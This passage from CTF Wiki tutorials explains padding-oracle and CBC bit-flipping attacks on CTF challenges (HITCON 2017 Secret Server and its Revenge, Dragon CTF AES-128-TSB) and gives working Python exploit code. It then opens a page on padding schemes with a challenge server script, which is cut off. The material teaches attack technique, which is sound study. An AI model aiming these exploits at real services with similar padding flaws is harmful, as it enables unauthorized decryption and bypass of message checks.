  flaglen = len(cipher_flag)\n    log.info(\"cipher flag is : \" + cipher_flag)\n\n    # get command not found cipher\n    p.sendline(base64.b64encode(iv_encrypt + cipher_welcome))\n    cipher_notfound = p.recvuntil('\\n', drop=True)\n\n    flag = \"\"\n    # brute force for every byte of flag\n    for i in range(flaglen - 7):\n        md5_indexi = getmd5enc(i, cipher_flag, cipher_welcome)\n        md5_indexi = base64.b64decode(md5_indexi)[16:]\n        log.info(\"get encrypt(md5(flag[7:7+i])): \" + md5_indexi)\n        for guess in range(256):\n            # locally compute md5 hash\n            guess_md5 = MD5.new(flag + chr(guess)).digest()\n            # try to null out the md5 plaintext and execute a command\n            payload = flipplain(guess_md5, 'get-time'.ljust(16, '\\x01'),\n                                iv_encrypt)\n            payload += md5_indexi\n            p.sendline(base64.b64encode(payload))\n            res = p.recvuntil(\"\\n\", drop=True)\n            # if we receive the block for 'command not found', the hash was wrong\n            if res == cipher_notfound:\n                print 'Guess {} is wrong.'.format(guess)\n            # otherwise we correctly guessed the hash and the command was executed\n            else:\n                print 'Found!'\n                flag += chr(guess)\n                print 'Flag so far:', flag\n                break\n\n\nif __name__ == \"__main__\":\n    main()\n\n```\n\n最后结果如下\n\n```Shell\nFlag so far: Paddin9_15_ve3y_h4rd__!!}\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\n```\n\n## 2017 HITCON Secret Server Revenge\n\n### 描述\n\n```\nThe password of zip is the flag of \"Secret Server\"\n```\n\n### 分析\n\n这个程序时接着上面的程序继续搞的，不过这次进行的简单的修改\n\n- 加密算法的 iv 未知，不过可以根据 Welcome 加密后的消息推算出来。\n- 程序多了一个 56 字节的 token。\n- 程序最多能进行 340 操作，因此上述的爆破自然不可行\n\n程序的大概流程如下\n\n1. 经过 proof of work\n2. 发送 “Welcome!!” 加密后的消息\n3. 在 340 次操作中，需要猜中 token 的值，然后会自动将 flag 输出。\n\n### 漏洞\n\n当然，在上个题目中存在的漏洞，在这个题目中仍然存在，即\n\n1. 任意执行给定命令\n2. 长度截断\n\n### 利用思路\n\n由于 340 的次数限制，虽然我们仍然可以获得 `md5(token[:i])` 加密后的值（**这里需要注意的是这部分加密后恰好是 32 个字节，前 16 个字节是 md5 后加密的值，后面的 16 个字节完全是填充的加密后的字节。**这里`md5(token[:i])`  特指前16个字节。）。但是，我们不能再次为了获得一个字符去爆破 256 次了。\n\n既然不能够爆破，那么我们有没有可能一次获取一个字节的大小呢？这里，我们再来梳理一下该程序可能可以泄漏的信息\n\n1. 某些消息的 md5 值加密后的值，这里我们可以获取 `md5(token[:i])` 加密后的值。\n2. unpad 每次会对解密后的消息进行 unpad，这个字节是根据解密后的消息的最后一个字节来决定的。如果我们可以计算出这个字节的大小，那么我们就可能可以知道一个字节的值。\n\n这里我们深入分析一下 unpad 的信息泄漏。如果我们将加密 IV 和 `encrypt(md5(token[:i]))` 放在某个密文 C 的后面，构成 `C|IV|encrypt(md5(token[:i]))`，那么解密出来的消息的最后一个明文块就是 `md5(token[:i])`。进而，在 unpad 的时候就是利用 `md5(token[:i])` 的最后一个字节（ 0-255）进行 unpad，之后对 unpad 后的字符串执行指定的命令（比如md5）。那么，如果我们**事先构造一些消息哈希后加密的样本**，然后将上述执行后的结果与样本比较，如果相同，那么我们基本可以确定 `md5(token[:i]) ` 的**最后一个字节**。然而，如果 `md5(token[:i])` 的最后一个字节小于16，那么在 unpad 时就会利用一些 md5 中的值，而这部分值，由于对于不同长度的 `token[:i]` 几乎都不会相同。所以可能需要特殊处理。\n\n我们已经知道了这个问题的关键，即生成与 unpad 字节大小对应的加密结果样本，以便于查表。\n\n具体利用思路如下\n\n1. 绕过 proof of work。\n2. 获取 token 加密后的结果 `token_enc` ，这里会在 token 前面添加 7 个字节 `\"token: \"` 。 因此加密后的长度为 64。\n3. 依次获取 `encrypt(md5(token[:i]))` 的结果，一共是 57 个，包括最后一个 token 的 padding。\n4. 构造与 unpad 大小对应的样本。这里我们构造密文 `token_enc|padding|IV_indexi|welcome_enc`。由于 `IV_indexi` 是为了修改最后一个明文块的最后一个字节，所以该字节处于变化之中。我们若想获取一些固定字节的哈希值，这部分自然不能添加。因此这里产生样本时 unpad 的大小范围为 17 ~ 255。如果最后测试时 `md5(token[:i])` 的最后一个字节小于17的话，基本就会出现一些未知的样本。很自然的一个想法是我们直接获取 255-17+1个这么多个样本，然而，如果这样做的话，根据上面 340 的次数（255-17+1+57+56>340）限制，我们显然不能获取到 token 的所有字节。所以这里我们需要想办法复用一些内容，这里我们选择复用  `encrypt(md5(token[:i]))`  的结果。那么我们在补充 padding 时需要确保一方面次数够用，另一方面可以复用之前的结果。这里我们设置 unpad 的循环为 17 到 208，并使得 unpad 大于 208 时恰好 unpad 到我们可以复用的地方。这里需要注意的是，当 `md5(token[:i])` 的最后一个字节为 0 时，会将所有解密后的明文 unpad 掉，因此会出现 command not found 的密文。\n5. 再次构造密文 `token_enc|padding|IV|encrypt(md5(token[:i])) ` ，那么，解密时即使用 `md5(token[:i])` 的最后一个字节进行 unpad。如果这个字节不小于17或者为0，则可以处理。如果这个字节小于17，那么显然，最后返回给用户的 md5 的结果并不在样本范围内，那么我们修改其最后一个字节的最高比特位，使其 unpad 后可以落在样本范围内。这样，我们就可以猜出 `md5(token[:i]) ` 的最后一个字节。\n6. 在猜出 `md5(token[:i]) ` 的最后一个字节后，我们可以在本地暴力破解 256 次，找出所有哈希值末尾为 `md5(token[:i]) ` 的最后一个字节的字符。\n7. 但是，在第六步中，对于一个 `md5(token[:i]) `  可能会找出多个备选字符，因为我们只需要使得其末尾字节是给定字节即可。\n8. 那么，问题来了，如何删除一些多余的备选字符串呢？这里我就选择了一个小 trick，即在逐字节枚举时，同时枚举出 token 的 padding。由于 padding 是 0x01 是固定的，所以我们只需要过滤出所有结尾不是 0x01 的token 即可。\n\n这里，在测试时，将代码中 `sleep` 注释掉了。以便于加快交互速度。利用代码如下\n\n```python\nfrom pwn import *\nimport base64, time, random, string\nfrom Crypto.Cipher import AES\nfrom Crypto.Hash import SHA256, MD5\n#context.log_level = 'debug'\n\np = remote('127.0.0.1', 7777)\n\n\ndef strxor(str1, str2):\n    return ''.join([chr(ord(c1) ^ ord(c2)) for c1, c2 in zip(str1, str2)])\n\n\ndef pad(msg):\n    pad_length = 16 - len(msg) % 16\n    return msg + chr(pad_length) * pad_length\n\n\ndef unpad(msg):\n    return msg[:-ord(msg[-1])]  # remove pad\n\n\ndef flipplain(oldplain, newplain, iv):\n    \"\"\"flip oldplain to new plain, return proper iv\"\"\"\n    return strxor(strxor(oldplain, newplain), iv)\n\n\ndef bypassproof():\n    p.recvuntil('SHA256(XXXX+')\n    lastdata = p.recvuntil(')', drop=True)\n    p.recvuntil(' == ')\n    digest = p.recvuntil('\\nGive me XXXX:', drop=True)\n\n    def proof(s):\n        return SHA256.new(s + lastdata).hexdigest() == digest\n\n    data = pwnlib.util.iters.mbruteforce(\n        proof, string.ascii_letters + string.digits, 4, method='fixed')\n    p.sendline(data)\n\n\ndef sendmsg(iv, cipher):\n    payload = iv + cipher\n    payload = base64.b64encode(payload)\n    p.sendline(payload)\n\n\ndef recvmsg():\n    data = p.recvuntil(\"\\n\", drop=True)\n    data = base64.b64decode(data)\n    return data[:16], data[16:]\n\n\ndef getmd5enc(i, cipher_token, cipher_welcome, iv):\n    \"\"\"return encrypt( md5( token[:i+1] ) )\"\"\"\n    ## keep iv[7:] do not change, so decrypt msg[7:] won't change\n    get_md5_iv = flipplain(\"token: \".ljust(16, '\\x00'), \"get-md5\".ljust(\n        16, '\\x00'), iv)\n    payload = cipher_token\n    ## calculate the proper last byte number\n    last_byte_iv = flipplain(\n        pad(\"Welcome!!\"),\n        \"a\" * 15 + chr(len(cipher_token) + 16 + 16 - (7 + i + 1)), iv)\n    payload += last_byte_iv + cipher_welcome\n    sendmsg(get_md5_iv, payload)\n    return recvmsg()\n\n\ndef get_md5_token_indexi(iv_encrypt, cipher_welcome, cipher_token):\n    md5_token_idxi = []\n    for i in range(len(cipher_token) - 7):\n        log.info(\"idx i: {}\".format(i))\n        _, md5_indexi = getmd5enc(i, cipher_token, cipher_welcome, iv_encrypt)\n        assert (len(md5_indexi) == 32)\n        # remove the last 16 byte for padding\n        md5_token_idxi.append(md5_indexi[:16])\n    return md5_token_idxi\n\n\ndef doin(unpadcipher, md5map, candidates, flag):\n    if unpadcipher in md5map:\n        lastbyte = md5map[unpadcipher]\n    else:\n        lastbyte = 0\n    if flag == 0:\n        lastbyte ^= 0x80\n    newcandidates = []\n    for x in candidates:\n        for c in range(256):\n            if MD5.new(x + chr(c)).digest()[-1] == chr(lastbyte):\n                newcandidates.append(x + chr(c))\n    candidates = newcandidates\n    print candidates\n    return candidates\n\n\ndef main():\n    bypassproof()\n\n    # result of encrypted Welcome!!\n    iv_encrypt, cipher_welcome = recvmsg()\n    log.info(\"cipher welcome is : \" + cipher_welcome)\n\n    # execute get-token\n    get_token_iv = flipplain(pad(\"Welcome!!\"), pad(\"get-token\"), iv_encrypt)\n    sendmsg(get_token_iv, cipher_welcome)\n    _, cipher_token = recvmsg()\n    token_len = len(cipher_token)\n    log.info(\"cipher token is : \" + cipher_token)\n\n    # get command not found cipher\n    sendmsg(iv_encrypt, cipher_welcome)\n    _, cipher_notfound = recvmsg()\n\n    # get encrypted(token[:i+1]),57 times\n    md5_token_idx_list = get_md5_token_indexi(iv_encrypt, cipher_welcome,\n                                              cipher_token)\n    # get md5map for each unpadsize, 209-17 times\n    # when upadsize>208, it will unpad ciphertoken\n    # then we can reuse\n    md5map = dict()\n    for unpadsize in range(17, 209):\n        log.info(\"get unpad size {} cipher\".format(unpadsize))\n        get_md5_iv = flipplain(\"token: \".ljust(16, '\\x00'), \"get-md5\".ljust(\n            16, '\\x00'), iv_encrypt)\n        ## padding 16*11 bytes\n        padding = 16 * 11 * \"a\"\n        ## calculate the proper last byte number, only change the last byte\n        ## set last_byte_iv = iv_encrypted[:15] | proper byte\n        last_byte_iv = flipplain(\n            pad(\"Welcome!!\"),\n            pad(\"Welcome!!\")[:15] + chr(unpadsize), iv_encrypt)\n        cipher = cipher_token + padding + last_byte_iv + cipher_welcome\n        sendmsg(get_md5_iv, cipher)\n        _, unpadcipher = recvmsg()\n        md5map[unpadcipher] = unpadsize\n\n    # reuse encrypted(token[:i+1])\n    for i in range(209, 256):\n        target = md5_token_idx_list[56 - (i - 209)]\n        md5map[target] = i\n\n    candidates = [\"\"]\n    # get the byte token[i], only 56 byte\n    for i in range(token_len - 7):\n        log.info(\"get token[{}]\".format(i))\n        get_md5_iv = flipplain(\"token: \".ljust(16, '\\x00'), \"get-md5\".ljust(\n            16, '\\x00'), iv_encrypt)\n        ## padding 16*11 bytes\n        padding = 16 * 11 * \"a\"\n        cipher = cipher_token + padding + iv_encrypt + md5_token_idx_list[i]\n        sendmsg(get_md5_iv, cipher)\n        _, unpadcipher = recvmsg()\n        # already in or md5[token[:i]][-1]='\\x00'\n        if unpadcipher in md5map or unpadcipher == cipher_notfound:\n            candidates = doin(unpadcipher, md5map, candidates, 1)\n        else:\n            log.info(\"unpad size 1-16\")\n            # flip most significant bit of last byte to move it in a good range\n            cipher = cipher[:-17] + strxor(cipher[-17], '\\x80') + cipher[-16:]\n            sendmsg(get_md5_iv, cipher)\n            _, unpadcipher = recvmsg()\n            if unpadcipher in md5map or unpadcipher == cipher_notfound:\n                candidates = doin(unpadcipher, md5map, candidates, 0)\n            else:\n                log.info('oh my god,,,, it must be in...')\n                exit()\n    print len(candidates)\n    # padding 0x01\n    candidates = filter(lambda x: x[-1] == chr(0x01), candidates)\n    # only 56 bytes\n    candidates = [x[:-1] for x in candidates]\n    print len(candidates)\n    assert (len(candidates[0]) == 56)\n\n    # check-token\n    check_token_iv = flipplain(\n        pad(\"Welcome!!\"), pad(\"check-token\"), iv_encrypt)\n    sendmsg(check_token_iv, cipher_welcome)\n    p.recvuntil(\"Give me the token!\\n\")\n    p.sendline(base64.b64encode(candidates[0]))\n    print p.recv()\n\n    p.interactive()\n\n\nif __name__ == \"__main__\":\n    main()\n```\n\n效果如下\n\n```shell\n...\n79\n1\nhitcon{uNp@d_M3th0D_i5_am4Z1n9!}\n```\n\n## Teaser Dragon CTF 2018 AES-128-TSB\n\n这个题目还是蛮有意思的，题目描述如下\n\n```\nHaven't you ever thought that GCM mode is overcomplicated and there must be a simpler way to achieve Authenticated Encryption? Here it is!\n\nServer: aes-128-tsb.hackable.software 1337\n\nserver.py\n```\n\n附件以及最后的 exp 自行到 ctf-challenge 仓库下寻找。\n\n题目的基本流程为\n\n- 不断接收 a 和 b 两个字符串，其中 a 为明文，b 为密文，注意\n  - b 在解密后需要满足尾部恰好等于 iv。\n- 如果 a 和 b 相等，那么根据\n  - a 为 `gimme_flag` ，输出加密后的 flag。\n  - 否则，输出一串随机加密的字符串。\n- 否则输出一串明文的字符串。\n\n此外，我们还可以发现题目中的 unpad 存在问题，可以截断指定长度。\n\n```python\ndef unpad(msg):\n    if not msg:\n        return ''\n    return msg[:-ord(msg[-1])]\n```\n\n一开始，很直接的思路是 a 和 b 的长度都输入 0 ，那么可以直接绕过 `a==b` 检查，获取一串随机密文加密的字符串。然而似乎并没有什么作用，我们来分析一下加密的流程\n\n```python\ndef tsb_encrypt(aes, msg):\n    msg = pad(msg)\n    iv = get_random_bytes(16)\n    prev_pt = iv\n    prev_ct = iv\n    ct = ''\n    for block in split_by(msg, 16) + [iv]:\n        ct_block = xor(block, prev_pt)\n        ct_block = aes.encrypt(ct_block)\n        ct_block = xor(ct_block, prev_ct)\n        ct += ct_block\n        prev_pt = block\n        prev_ct = ct_block\n    return iv + ct\n```\n\n不妨假设 $P_0=iv,C_0=iv$，则\n\n $C_i=C_{i-1}\\oplus E(P_{i-1} \\oplus P_i)$\n\n那么，假设消息长度为 16，与我们想要得到的`gimme_flag` padding 后长度类似，则\n\n $C_1=IV\\oplus E( IV \\oplus P_1)$\n\n $C_2=C_1 \\oplus E(P_1 \\oplus IV)$\n\n可以很容易的发现 $C_2=IV$。\n\n（[盗图](https://github.com/pberba/ctf-solutions/tree/master/20180929_teaser_dragon/aes_128_tsb)，下面的图片更加清晰\n\n![](figure/aes-tsb-encryption.png)\n\n反过来想，如果我们向服务器发送 `iv+c+iv`，那么总能绕过 `tsb_decrypt` 的 mac 检查\n\n```python\ndef tsb_decrypt(aes, msg):\n    iv, msg = msg[:16], msg[16:]\n    prev_pt = iv\n    prev_ct = iv\n    pt = ''\n    for block in split_by(msg, 16):\n        pt_block = xor(block, prev_ct)\n        pt_block = aes.decrypt(pt_block)\n        pt_block = xor(pt_block, prev_pt)\n        pt += pt_block\n        prev_pt = pt_block\n        prev_ct = block\n    pt, mac = pt[:-16], pt[-16:]\n    if mac != iv:\n        raise CryptoError()\n    return unpad(pt)\n```\n\n那么此时，服务器解密后的消息则是\n\n$unpad(IV \\oplus D(C_1 \\oplus IV))$\n\n### 获取明文最后一个字节\n\n我们可以考虑控制 D 解密的消息为常数值，比如全零，即`C1=IV`，那么我们就可以从 0 到 255 枚举 IV 的最后一个字节，得到 $IV \\oplus D(C_1 \\oplus IV)$ 的最后一个字节也是 0~255。而只有是 1~15 的时候，`unpad` 操作过后，消息长度不为 0。因此，我们可以在枚举时统计究竟哪些数字导致了长度不为零，并标记为 1，其余标记为 0。\n\n```python\ndef getlast_byte(iv, block):\n    iv_pre = iv[:15]\n    iv_last = ord(iv[-1])\n    tmp = []\n    print('get last byte')\n    for i in range(256):\n        send_data('')\n        iv = iv_pre + chr(i)\n        tmpblock = block[:15] + chr(i ^ ord(block[-1]) ^ iv_last)\n        payload = iv + tmpblock + iv\n        send_data(payload)\n        length, data = recv_data()\n        if 'Looks' in data:\n            tmp.append(1)\n        else:\n            tmp.append(0)\n    last_bytes = []\n    for i in range(256):\n        if tmp == xor_byte_map[i][0]:\n            last_bytes.append(xor_byte_map[i][1])\n    print('possible last byte is ' + str(last_bytes))\n    return last_bytes\n```\n\n此外，我们可以在最初的时候打表获取最后一个字节所有的可能情况，记录在 xor_byte_map 中。\n\n```python\n\"\"\"\nevery item is a pair [a,b]\na is the xor list\nb is the idx which is zero when xored\n\"\"\"\nxor_byte_map = []\nfor i in range(256):\n    a = []\n    b = 0\n    for j in range(256):\n        tmp = i ^ j\n        if tmp > 0 and tmp <= 15:\n            a.append(1)\n        else:\n            a.append(0)\n        if tmp == 0:\n            b = j\n    xor_byte_map.append([a, b])\n```\n\n通过与这个表进行对比，我们就可以知道最后一个字节可能的情况。\n\n### 解密任意加密块\n\n在获取了明文最后一个字节后，我们就可以利用  unpad 的漏洞，从长度 1 枚举到长度 15 来获得对应的明文内容。\n\n```python\ndef dec_block(iv, block):\n    last_bytes = getlast_byte(iv, block)\n\n    iv_pre = iv[:15]\n    iv_last = ord(iv[-1])\n    print('try to get plain')\n    plain0 = ''\n    for last_byte in last_bytes:\n        plain0 = ''\n        for i in range(15):\n            print 'idx:', i\n            tag = False\n            for j in range(256):\n                send_data(plain0 + chr(j))\n                pad_size = 15 - i\n                iv = iv_pre + chr(pad_size ^ last_byte)\n                tmpblock = block[:15] + chr(\n                    pad_size ^ last_byte ^ ord(block[-1]) ^ iv_last\n                )\n                payload = iv + tmpblock + iv\n                send_data(payload)\n                length, data = recv_data()\n                if 'Looks' not in data:\n                    # success\n                    plain0 += chr(j)\n                    tag = True\n                    break\n            if not tag:\n                break\n        # means the last byte is ok\n        if plain0 != '':\n            break\n    plain0 += chr(iv_last ^ last_byte)\n    return plain0\n```\n\n### 解密出指定明文\n\n这一点比较简单，我们希望利用这一点来获取 `gimme_flag` 的密文\n\n```python\n    print('get the cipher of flag')\n    gemmi_iv1 = xor(pad('gimme_flag'), plain0)\n    gemmi_c1 = xor(gemmi_iv1, cipher0)\n    payload = gemmi_iv1 + gemmi_c1 + gemmi_iv1\n    send_data('gimme_flag')\n    send_data(payload)\n    flag_len, flag_cipher = recv_data()\n```\n\n其中 plain0 和 cipher0 是我们获取的 AES 加密的明密文对，不包括之前和之后的两个异或。\n\n### 解密 flag\n\n这一点，其实就是利用解密任意加密块的功能实现的，如下\n\n```python\n    print('the flag cipher is ' + flag_cipher.encode('hex'))\n    flag_cipher = split_by(flag_cipher, 16)\n\n    print('decrypt the blocks one by one')\n    plain = ''\n    for i in range(len(flag_cipher) - 1):\n        print('block: ' + str(i))\n        if i == 0:\n            plain += dec_block(flag_cipher[i], flag_cipher[i + 1])\n        else:\n            iv = plain[-16:]\n            cipher = xor(xor(iv, flag_cipher[i + 1]), flag_cipher[i])\n            plain += dec_block(iv, cipher)\n            pass\n        print('now plain: ' + plain)\n    print plain\n```\n\n可以思考一下为什么第二块之后的密文操作会有所不同。\n\n完整的代码参考 ctf-challenge 仓库。\n\n## 参考资料\n\n- [分组加密模式](https://zh.wikipedia.org/wiki/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F)\n- https://en.wikipedia.org/wiki/Padding_oracle_attack\n- http://netifera.com/research/poet/PaddingOraclesEverywhereEkoparty2010.pdf\n- https://ctftime.org/writeup/7975\n- https://ctftime.org/writeup/7974\n", "timestamp": "2025-10-21T22:02:52.254641"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/crypto/blockcipher/mode/padding.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/blockcipher/mode/padding.md", "content": "# 填充方式\n\n正如我们之前所说，在分组加密中，明文的长度往往并不满足要求，需要进行 padding，而如何 padding 目前也已经有了不少的规定。\n\n常见的 [填充规则]( https://www.di-mgt.com.au/cryptopad.html) 如下。**需要注意的是，即使消息的长度是块大小的整数倍，仍然需要填充。**\n\n一般来说，如果在解密之后发现 Padding 不正确，则往往会抛出异常。我们也因此可以知道 Paddig 是否正确。\n\n## Pad with bytes all of the same value as the number of padding bytes (PKCS5 padding)\n\n举例子如下\n\n```\nDES INPUT BLOCK  = f  o  r  _  _  _  _  _\n(IN HEX)           66 6F 72 05 05 05 05 05\nKEY              = 01 23 45 67 89 AB CD EF\nDES OUTPUT BLOCK = FD 29 85 C9 E8 DF 41 40\n```\n\n## Pad with 0x80 followed by zero bytes (OneAndZeroes Padding)\n\n举例子如下\n\n```\nDES INPUT BLOCK  = f  o  r  _  _  _  _  _\n(IN HEX)           66 6F 72 80 00 00 00 00\nKEY              = 01 23 45 67 89 AB CD EF\nDES OUTPUT BLOCK = BE 62 5D 9F F3 C6 C8 40\n```\n\n这里其实就是和 md5 和 sha1 的 padding 差不多。\n\n## Pad with zeroes except make the last byte equal to the number of padding bytes\n\n举例子如下\n\n```\nDES INPUT BLOCK  = f  o  r  _  _  _  _  _\n(IN HEX)           66 6f 72 00 00 00 00 05\nKEY              = 01 23 45 67 89 AB CD EF\nDES OUTPUT BLOCK = 91 19 2C 64 B5 5C 5D B8\n```\n\n## Pad with zero (null) characters\n\n举例子如下\n\n```\nDES INPUT BLOCK  = f  o  r  _  _  _  _  _\n(IN HEX)           66 6f 72 00 00 00 00 00\nKEY              = 01 23 45 67 89 AB CD EF\nDES OUTPUT BLOCK = 9E 14 FB 96 C5 FE EB 75\n```\n\n## Pad with spaces\n\n举例子如下\n\n```\nDES INPUT BLOCK  = f  o  r  _  _  _  _  _\n(IN HEX)           66 6f 72 20 20 20 20 20\nKEY              = 01 23 45 67 89 AB CD EF\nDES OUTPUT BLOCK = E3 FF EC E5 21 1F 35 25\n```\n\n##  2018 上海市大学生网络安全大赛 aessss\n\n有时候可以针对一些使用不当的 Padding 进行攻击。这里以 2018 上海市大学生网络安全大赛的一道题目为例：\n\n题目脚本如下：\n\n```python\nimport random\nimport sys\nimport string\nfrom hashlib import sha256\nimport SocketServer\nfrom Crypto.Cipher import AES\nfrom secret import FLAG, IV, KEY\n\n\nclass Task(SocketServer.BaseRequestHandler):\n    def proof_of_work(self):\n        proof = ''.join(\n            [random.choice(string.ascii_letters+string.digits) for _ in xrange(20)])\n        # print proof\n        digest = sha256(proof).hexdigest()\n        self.request.send(\"sha256(XXXX+%s) == %s\\n\" % (proof[4:], digest))\n        self.request.send('Give me XXXX:')\n        x = self.request.recv(10)\n        x = x.strip()\n        if len(x) != 4 or sha256(x+proof[4:]).hexdigest() != digest:\n            return False\n        return True\n\n    def pad(self, s):\n        s += (256 - len(s)) * chr(256 - len(s))\n        ret = ['\\x00' for _ in range(256)]\n        for index, pos in enumerate(self.s_box):\n            ret[pos] = s[index]\n        return ''.join(ret)\n\n    def unpad(self, s):\n        ret = ['\\x00' for _ in range(256)]\n        for index, pos in enumerate(self.invs_box):\n            ret[pos] = s[index]\n        return ''.join(ret[0:-ord(ret[-1])])\n\n    s_box = [\n        0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76,\n        0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0,\n        0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15,\n        0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75,\n        0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84,\n        0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF,\n        0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8,\n        0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2,\n        0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73,\n        0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB,\n        0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79,\n        0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08,\n        0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A,\n        0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E,\n        0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF,\n        0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16\n    ]\n\n    invs_box = [\n        0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB,\n        0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB,\n        0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E,\n        0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25,\n        0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92,\n        0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84,\n        0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06,\n        0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B,\n        0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73,\n        0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E,\n        0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B,\n        0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4,\n        0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F,\n        0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF,\n        0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61,\n        0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D\n    ]\n\n    def encrypt(self, msg):\n        cipher = AES.new(KEY, AES.MODE_CBC, IV)\n        return cipher.encrypt(msg).encode('hex')\n\n    def handle(self):\n        if not self.proof_of_work():\n            return\n        self.request.settimeout(15)\n        req = self.request\n        flag_len = len(FLAG)\n        assert(flag_len == 33)\n        self.flag = self.pad(FLAG)\n        assert(len(self.flag) == 256)\n\n        while True:\n            req.sendall(\n                'Welcome to AES(WXH) encrypt system.\\n1. get encrypted flag.\\n2. pad flag.\\n3.Do some encrypt.\\nYour choice:')\n            cmd = req.recv(2).strip()\n            try:\n                cmd = int(cmd)\n            except ValueError:\n                cmd = 0\n            if cmd == 1:\n                enc = self.encrypt(self.flag)\n                req.sendall('Here is the encrypted flag: 0x%s\\n' % enc)\n            elif cmd == 2:\n                req.sendall('Pad me something:')\n                self.flag = self.unpad(self.flag)[\n                    :flag_len] + req.recv(1024).strip()\n                assert(len(self.flag) <= 256)\n                self.flag = self.pad(self.flag)\n                req.sendall('Done.\\n')\n            elif cmd == 3:\n                req.sendall('What do you want to encrypt:')\n                msg = 